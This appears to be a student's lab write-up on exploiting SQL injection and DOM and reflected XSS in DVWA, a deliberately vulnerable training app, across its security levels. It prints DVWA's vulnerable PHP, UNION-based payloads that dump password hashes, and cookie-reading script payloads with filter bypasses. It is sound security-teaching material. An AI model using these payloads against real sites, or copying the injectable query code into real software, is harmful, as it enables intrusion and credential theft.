# DVWA - SQL Injection & XSS (Cross Site Scripting)

# SQL Injection
<details>
<summary>Introduction of SQL Injection?</summary>

### What is SQL Injection?
SQL Injection is a type of web security vulnerability that allows an attacker to manipulate an application's database query by inserting malicious SQL code into input fields, leading to unauthorized access or data manipulation.

### Basic Principles of SQL Injection

SQL Injection typically occurs when an application directly embeds user input into SQL queries without sufficient validation or sanitization. When an application incorporates user input as part of an SQL statement, an attacker can craft specific inputs to alter the final SQL statement to achieve their goals, such as bypassing authentication, reading, or modifying database data.

### Example

Suppose there is a simple login form where a user inputs a username and password, and the system executes the following SQL query to verify the user's identity:

```sql
SELECT * FROM users WHERE username = 'user input username' AND password = 'user input password';
```

If the user inputs the following:

- Username: `admin`
- Password: `' OR '1'='1`

The generated SQL statement would become:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';

```

Since `'1'='1'` is always true, this query will return information for all users in the database, allowing the attacker to bypass authentication and log in to the system.
</details>


---

<img width="943" alt="Screenshot 2024-05-14 at 3 42 56 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/9e23f1c0-361e-44a1-861c-f1b0baa2c69d">


<details>
<summary>Low-level security</summary>
    
### DVWA SQL Injection - Low level

1. **View Source Code**:
    
    ```php
    <?php
    
    if( isset( $_REQUEST[ 'Submit' ] ) ) { 
        // Get input
        $id = $_REQUEST[ 'id' ];
    
        // Check database
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        // Get results
        while( $row = mysqli_fetch_assoc( $result ) ) {
            // Get values
            $first = $row["first_name"];
            $last  = $row["last_name"];
    
            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
        }
        mysqli_close($GLOBALS["___mysqli_ston"]);
    }
    ?>
    ```
    
2. **Source code Analysis**:
    - The server-side `low.php`  script doesn’t perform any check or filtering on user’s id input and directly displays the execution result of the SQL query to the client-side.
    - Try input `' OR '1'='1`  it returns all the result of user’s first name and surname. With that experiment It doesn’t return errors, So we have chance to get database information through SQL injection.
        
        <img width="941" alt="Screenshot 2024-05-14 at 3 55 35 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/5e91e4cc-1c05-47c7-93e4-67fc4f64139b">

        
      
        
3. **Vulnerabilities Exploitation**:
    - **The vulnerable script:** `"SELECT first_name, last_name FROM users WHERE user_id = '$id';"`
    - **Get the usernames and passwords from database :**  `’ UNION SELECT user, password FROM users#`
        <img width="931" alt="Untitled" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/dec7790e-0f67-4c5c-9156-00aea2b19431">
        
    - **Crack the hash:** Even though passwords are hashed but still try to crack it with library attack.
        <img width="850" alt="Screenshot_2024-05-14_at_7 47 39_in_the_evening" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/58f34eb1-ae2b-48c5-bb52-4e0d4c824e8d">      

</details>


---

<details>
<summary>Medium-level security</summary>
    
### DVWA SQL Injection - Medium level

1. **View Source Code**:
    
    ```php
    <?php
    
    if( isset( $_POST[ 'Submit' ] ) ) {
    	// Get input
    	$id = $_POST[ 'id' ];
    
    	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
    
    	$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
    
    	// Get results
    	while( $row = mysqli_fetch_assoc( $result ) ) {
    		// Display values
    		$first = $row["first_name"];
    		$last  = $row["last_name"];
    
    		// Feedback for end user
    		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    	}
    
    }
    
    // This is used later on in the index.php page
    // Setting it here so we can close the database connection in here like in the rest of the source scripts
    $query  = "SELECT COUNT(*) FROM users;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    $number_of_rows = mysqli_fetch_row( $result )[0];
    
    mysqli_close($GLOBALS["___mysqli_ston"]);
    ?>
    ```
    
2. **Source code Analysis**:
    - `medium.php`  script try to avoid user input by giving dropdown selection instead.
    - It is still able to change the script in `inspect element`
        
        
        <img width="754" alt="Screenshot 2024-05-14 at 8 15 46 in the evening" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/07afd223-6374-4ea8-9953-cdb9a0448222">

3. **Vulnerabilities Exploitation**:
    - **Get the usernames and passwords from database :**  edit in inspector mode by inserting script as in the picture below:
        
        <img width="843" alt="Untitled (1)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/ab7335b5-98ee-415f-bf4a-b718ff7d9b98">

        
    - **Submit:**
        
        <img width="748" alt="Untitled (2)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/bf31b415-93fa-42aa-a2dc-42d4504a0d3c">

</details>        

---

<details>
<summary>High-level security</summary>
    
### DVWA SQL Injection - High level

1. **View Source Code**:
    
    ```php
    <?php
    
    if( isset( $_SESSION [ 'id' ] ) ) {
    	// Get input
    	$id = $_SESSION[ 'id' ];
    
    	// Check database
    	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
    
    	// Get results
    	while( $row = mysqli_fetch_assoc( $result ) ) {
    		// Get values
    		$first = $row["first_name"];
    		$last  = $row["last_name"];
    
    		// Feedback for end user
    		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    	}
    
    	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?>
    ```
    
2. **Source code Analysis**:
    - `High.php`  script want to avoid direct input so it call new popup window for input, from source code can be seen that it is very similar to low-level but it is different here with `LIMIT 1;` in the query.
    - However, still can do `’ UNION SELECT user, password FROM users#` use the hashtag to ignore the condition.
        
        <img width="751" alt="Screenshot 2024-05-15 at 12 21 10 at night" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/39d3376e-af17-44ad-9b03-58af3b3e9d7f">

        
3. **Vulnerabilities Exploitation**:
    - **Submit:**
        
        <img width="1440" alt="Untitled (3)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/19cfcb24-7e6a-4fee-8c88-08c20b49dcd1">

</details>        

---

<details>
<summary>As proof here</summary>

- As can be seen, the background is my desktop wallpaper.
- In about, it displays my name.
- The top bar can see the date 14, May, 8:27PM and compare to the name of screenshot (the same date, similar time because i just did it at the moment.
- The navigation bar on the middle-right are from my screen.
- Look at another window behind setting and finder, that is kali VM is running and I was testng on it.
    
    <img width="1440" alt="Untitled 5" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/ada31e8e-e0a5-4457-a164-23e01563d675">

</details>

---


# DOM-XSS (Cross site scripting)

<img width="882" alt="Untitled (4)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/205e04f0-1cd6-4bf9-aafc-83c673981a5a">

<details>
    
<summary>low-level security</summary>

### DVWA XSS - Low level 

1. **The URL**:
    
    ```php
    // original URL
    127.0.0.1/dvwa/vulunerabilities/xss-d/
    
    // after selecting language
    127.0.0.1/dvwa/vulunerabilities/xss-d/default=English
    ```
    
2. **Testing with inserting javascript into URL**:
    
    ```jsx
    <script> alert(”XSS_Test”) </script>
    ```
    
3. **Updated URL:**
    
    ```jsx
    127.0.0.1/dvwa/vulunerabilities/xss-d/default=English <script> alert(”XSS_Test”) </script>
    ```
    
4. **Vulnerabilities Found**:
    
    <img width="1184" alt="Screenshot 2024-05-17 at 12 47 02 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/93b9ddac-f9f8-4dd4-81fd-7922afece9d6">

    
5. **Vulnerabilities Exploitation**:
    - **The vulnerable script:** `<script> alert(document.cookie) </script>`
      
        <img width="1294" alt="Screenshot 2024-05-17 at 12 49 37 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/1f7e5ed5-160c-45ac-aa03-bf20c7d3cbc9">

          
</details>

---

<details>

<summary> medium-level security </summary>

### DVWA XSS - Medium level

1. **The URL**:
    
    ```php
    // original URL
    127.0.0.1/dvwa/vulunerabilities/xss-d/
    
    // after selecting language
    127.0.0.1/dvwa/vulunerabilities/xss-d/default=English
    ```
    
2. **Testing with inserting javascript into URL**:
    
    ```jsx
    <script> alert(”XSS_Test”) </script>
    
    // failed because it has filtering script.
    ```
    
3. **Try with:**
    
    ```jsx
    </select><img src/onerror=alert(”XSS_Test”)>
    ```
    
4. **Vulnerabilities Found**:
   
    <img width="1344" alt="Untitled (5)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/3cf4b170-a7e0-466e-b613-a3631cefee7a">

    
 </details>
 
---


# Reflected based XSS

<img width="774" alt="Screenshot 2024-05-19 at 5 44 15 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/cbb355ce-bc2a-4a1f-ab36-58bbb4899cf5">

<details>

<summary>low-level</summary>

### XSS - Low level

1. **The URL**:
    
    ```php
    // original URL
    127.0.0.1/dvwa/vulunerabilities/xss-r/
    
    // after input name
    127.0.0.1/dvwa/vulunerabilities/xss-r/?name=munin#
    ```
    
2. **Testing with inserting javascript into URL**:
    
    ```jsx
    <script> alert(”XSS_Test”) </script>
    
    <script> alert(document.cookie) </script>
    ```
    
3. **Vulnerabilities Found**:
    
    <img width="1244" alt="Untitled (6)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/984f0103-54fd-4233-bfe4-0c991a2186db">

    <img width="1211" alt="Untitled 9" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/66ce2463-7715-43db-a916-acafe3759629">

    
</details>

---

<details>

<summary>medium-level</summary>

### XSS - Medium level

1. **Input javascript into URL**:
    
    Because from the source code in medium level, it is filtering <script> however it is string and check only small capital letter, Hence we can try capital letter to escape the filtering.
    
    ```jsx
    <SCRIPT> alert("Hello") </SCRIPT>
    
    <SCRIPT> alert(document.cookie) </SCRIPT>
    ```
    
2. **Vulnerabilities Found**:
   
    <img width="1230" alt="Screenshot_2024-05-17_at_2 57 07_in_the_afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/9ebf671e-f1ca-48d4-a090-2835f7e9da23">

    <img width="1268" alt="Screenshot_2024-05-17_at_2 57 57_in_the_afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/37976eab-6649-4a5d-b64c-2b5a4a37a84a">
    
</details>

---
